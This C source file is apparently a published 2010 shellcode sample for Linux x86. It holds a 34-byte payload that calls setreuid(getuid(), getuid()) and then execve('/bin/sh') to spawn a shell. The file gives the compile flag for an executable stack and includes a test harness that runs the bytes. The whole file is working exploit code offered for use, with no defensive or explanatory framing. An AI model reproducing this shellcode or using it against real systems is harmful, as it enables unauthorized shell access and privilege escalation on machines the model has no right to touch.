#include <stdio.h>
#include <string.h>

/*
	by Magnefikko
	14.04.2010
	magnefikko@gmail.com
	promhyl.oz.pl
	Subgroup: #PRekambr
	Name: 34 bytes setreud(getuid(), getuid()) & execve("/bin/sh") shellcode
	Platform: Linux x86

	setreuid(getuid(), getuid());
	execve("/bin/sh");

	gcc -Wl,-z,execstack filename.c

	shellcode:

\x6a\x18\x58\xcd\x80\x50\x50\x5b\x59\x6a\x46\x58\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80

*/


int main(){
	char shell[] =
"\x6a\x18\x58\xcd\x80\x50\x50\x5b\x59\x6a\x46\x58\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80";
	printf("by Magnefikko\nmagnefikko@gmail.com\npromhyl.oz.pl\n\nstrlen(shell)
= %d\n", strlen(shell));
	(*(void (*)()) shell)();
}